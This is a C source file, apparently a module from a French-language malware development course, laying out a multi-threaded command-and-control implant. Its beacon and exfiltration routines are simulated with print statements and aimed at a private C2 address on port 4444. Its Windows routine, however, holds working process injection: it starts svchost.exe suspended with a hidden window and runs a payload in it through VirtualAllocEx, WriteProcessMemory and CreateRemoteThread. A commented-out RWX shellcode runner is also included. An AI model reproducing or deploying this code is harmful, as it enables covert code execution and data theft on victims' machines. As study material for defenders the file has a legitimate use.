/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development avancées. Usage éducatif uniquement.
 * Tests sur VM isolées. Usage malveillant = PRISON.
 *
 * Module 21 : Process & Threads - C2 Multi-Threading Architecture
 *
 * Ce code démontre :
 * - Thread pool pour gestion de multiples beacons C2
 * - Process spawning pour isolation de payloads
 * - IPC pour communication inter-modules
 * - Thread detachment pour persistance
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <process.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <unistd.h>
    #include <pthread.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <signal.h>
    #include <fcntl.h>
#endif

// Configuration du malware
#define MAX_THREADS 10
#define BEACON_INTERVAL 5
#define C2_SERVER "192.168.1.100"
#define C2_PORT 4444

// Structure pour thread worker
typedef struct {
    int thread_id;
    int active;
    void* payload_data;
    size_t payload_size;
} ThreadWorker;

// Structure pour commandes C2
typedef struct {
    int cmd_type;  // 0=beacon, 1=execute, 2=exfiltrate, 3=migrate
    char data[1024];
} C2Command;

// Variables globales
#ifdef _WIN32
    HANDLE g_mutex;
    ThreadWorker g_workers[MAX_THREADS];
#else
    pthread_mutex_t g_mutex = PTHREAD_MUTEX_INITIALIZER;
    ThreadWorker g_workers[MAX_THREADS];
#endif

// ============================================================================
// SECTION 1 : BEACON C2 THREAD (Heart of C2 Communication)
// ============================================================================

#ifdef _WIN32
DWORD WINAPI beacon_thread(LPVOID param) {
#else
void* beacon_thread(void* param) {
#endif
    ThreadWorker* worker = (ThreadWorker*)param;

    printf("[Thread %d] Beacon started\n", worker->thread_id);

    while(worker->active) {
        // Simuler beacon heartbeat vers C2
        printf("[Thread %d] Sending heartbeat to %s:%d\n",
               worker->thread_id, C2_SERVER, C2_PORT);

        // En réalité : socket connection + send beacon
        // send(sock, beacon_data, len, 0);

        // Simuler réception de commande C2
        C2Command cmd;
        cmd.cmd_type = rand() % 4;

        switch(cmd.cmd_type) {
            case 0: // Beacon ACK
                printf("[Thread %d] Beacon ACK received\n", worker->thread_id);
                break;
            case 1: // Execute shellcode
                printf("[Thread %d] Execute command received\n", worker->thread_id);
                // execute_in_memory(cmd.data);
                break;
            case 2: // Exfiltrate data
                printf("[Thread %d] Exfiltration task received\n", worker->thread_id);
                break;
            case 3: // Migrate process
                printf("[Thread %d] Migration command received\n", worker->thread_id);
                break;
        }

#ifdef _WIN32
        Sleep(BEACON_INTERVAL * 1000);
#else
        sleep(BEACON_INTERVAL);
#endif
    }

    printf("[Thread %d] Beacon stopped\n", worker->thread_id);

#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

// ============================================================================
// SECTION 2 : PROCESS SPAWNING POUR ISOLATION (Fork Bomb Prevention)
// ============================================================================

#ifndef _WIN32
void spawn_isolated_payload(const char* shellcode, size_t size) {
    printf("[Fork] Spawning isolated payload process\n");

    pid_t pid = fork();

    if (pid < 0) {
        perror("[Fork] Failed");
        return;
    }

    if (pid == 0) {
        // Processus enfant - isolé du parent
        printf("[Child %d] Executing payload in isolation\n", getpid());

        // Détachement du terminal pour éviter signaux
        setsid();

        // Exécution du payload (simulée)
        // En réalité : allocation RWX memory + execution
        /*
        void* exec_mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(exec_mem, shellcode, size);
        ((void(*)())exec_mem)();
        */

        printf("[Child %d] Payload executed, exiting\n", getpid());
        exit(0);
    } else {
        // Processus parent continue
        printf("[Parent] Child PID %d spawned, continuing operations\n", pid);

        // Ne pas wait() pour détacher complètement
        // L'enfant devient orphelin et est adopté par init/systemd
    }
}
#endif

#ifdef _WIN32
void spawn_isolated_payload_windows(const char* payload, size_t size) {
    printf("[CreateProcess] Spawning isolated payload\n");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Cacher la fenêtre
    ZeroMemory(&pi, sizeof(pi));

    // Créer processus suspendu pour injection
    if (!CreateProcessA(
        NULL,
        "C:\\Windows\\System32\\svchost.exe",  // Process légitime
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi)) {
        printf("[CreateProcess] Failed: %lu\n", GetLastError());
        return;
    }

    printf("[Parent] Process created PID %lu, injecting payload\n", pi.dwProcessId);

    // Allouer mémoire dans processus distant
    LPVOID remote_mem = VirtualAllocEx(pi.hProcess, NULL, size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remote_mem) {
        // Écrire payload
        WriteProcessMemory(pi.hProcess, remote_mem, payload, size, NULL);

        // Créer thread distant pour exécuter
        HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
                                           (LPTHREAD_START_ROUTINE)remote_mem,
                                           NULL, 0, NULL);
        if (hThread) {
            printf("[Parent] Remote thread created\n");
            CloseHandle(hThread);
        }
    }

    // Reprendre le thread principal (sans notre payload il ne fait rien)
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
#endif

// ============================================================================
// SECTION 3 : IPC POUR COMMUNICATION INTER-MODULES
// ============================================================================

#ifndef _WIN32
void ipc_exfiltration_channel() {
    printf("[IPC] Setting up exfiltration channel\n");

    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("[IPC] Pipe creation failed");
        return;
    }

    pid_t pid = fork();

    if (pid == 0) {
        // Module d'exfiltration (enfant)
        close(pipefd[1]);  // Fermer écriture

        char buffer[1024];
        ssize_t n;

        printf("[Exfil Child] Waiting for data to exfiltrate\n");

        while ((n = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
            buffer[n] = '\0';
            printf("[Exfil Child] Exfiltrating: %s\n", buffer);

            // En réalité : envoi vers C2
            // send_to_c2(buffer, n);
        }

        close(pipefd[0]);
        exit(0);
    } else {
        // Module principal (parent)
        close(pipefd[0]);  // Fermer lecture

        // Simuler collecte de données sensibles
        const char* sensitive_data[] = {
            "Passwords: admin:P@ssw0rd",
            "Credit Card: 4532-1234-5678-9012",
            "SSH Keys: /home/user/.ssh/id_rsa"
        };

        for (int i = 0; i < 3; i++) {
            printf("[Main] Collecting sensitive data\n");
            write(pipefd[1], sensitive_data[i], strlen(sensitive_data[i]));
            sleep(1);
        }

        close(pipefd[1]);
        wait(NULL);
        printf("[Main] Exfiltration complete\n");
    }
}
#endif

// ============================================================================
// SECTION 4 : THREAD POOL MANAGEMENT
// ============================================================================

void init_thread_pool() {
    printf("[ThreadPool] Initializing %d workers\n", MAX_THREADS);

#ifdef _WIN32
    g_mutex = CreateMutex(NULL, FALSE, NULL);
#endif

    for (int i = 0; i < MAX_THREADS; i++) {
        g_workers[i].thread_id = i;
        g_workers[i].active = 0;
        g_workers[i].payload_data = NULL;
        g_workers[i].payload_size = 0;
    }
}

void start_worker(int worker_id) {
    if (worker_id >= MAX_THREADS) return;

    ThreadWorker* worker = &g_workers[worker_id];
    worker->active = 1;

#ifdef _WIN32
    HANDLE hThread = CreateThread(NULL, 0, beacon_thread, worker, 0, NULL);
    if (hThread) {
        printf("[ThreadPool] Worker %d started (Windows)\n", worker_id);
        CloseHandle(hThread);  // Détacher le thread
    }
#else
    pthread_t thread;
    pthread_attr_t attr;

    // Configurer thread détaché (ne nécessite pas pthread_join)
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    if (pthread_create(&thread, &attr, beacon_thread, worker) == 0) {
        printf("[ThreadPool] Worker %d started (POSIX)\n", worker_id);
    }

    pthread_attr_destroy(&attr);
#endif
}

void stop_worker(int worker_id) {
    if (worker_id >= MAX_THREADS) return;

    g_workers[worker_id].active = 0;
    printf("[ThreadPool] Worker %d stopped\n", worker_id);
}

// ============================================================================
// SECTION 5 : SIGNAL HANDLING POUR CLEANUP
// ============================================================================

#ifndef _WIN32
void signal_handler(int signum) {
    printf("\n[Signal] Received signal %d, cleaning up\n", signum);

    // Arrêter tous les workers
    for (int i = 0; i < MAX_THREADS; i++) {
        if (g_workers[i].active) {
            stop_worker(i);
        }
    }

    pthread_mutex_destroy(&g_mutex);
    exit(0);
}
#endif

// ============================================================================
// MAIN
// ============================================================================

int main(void) {
    srand(time(NULL));

    printf("=========================================\n");
    printf("  C2 Multi-Threading Architecture Demo\n");
    printf("=========================================\n\n");

    // Installer signal handler pour cleanup propre
#ifndef _WIN32
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
#endif

    // Initialiser thread pool
    init_thread_pool();

    // Démarrer 3 workers pour simulation
    printf("\n[Main] Starting worker threads\n");
    for (int i = 0; i < 3; i++) {
        start_worker(i);
    }

    // Attendre un peu pour voir les beacons
    printf("\n[Main] Workers running, observe beacons...\n");
#ifdef _WIN32
    Sleep(15000);
#else
    sleep(15);
#endif

    // Démonstration process spawning
    printf("\n[Main] Demonstrating process isolation\n");
    const char dummy_shellcode[] = "\x90\x90\x90\x90";  // NOP sled

#ifdef _WIN32
    spawn_isolated_payload_windows(dummy_shellcode, sizeof(dummy_shellcode));
#else
    spawn_isolated_payload(dummy_shellcode, sizeof(dummy_shellcode));

    // Démonstration IPC
    printf("\n[Main] Demonstrating IPC exfiltration\n");
    ipc_exfiltration_channel();
#endif

    // Arrêter workers
    printf("\n[Main] Stopping all workers\n");
    for (int i = 0; i < 3; i++) {
        stop_worker(i);
    }

    // Attendre arrêt propre
#ifdef _WIN32
    Sleep(2000);
    CloseHandle(g_mutex);
#else
    sleep(2);
    pthread_mutex_destroy(&g_mutex);
#endif

    printf("\n[Main] All operations complete\n");
    return 0;
}
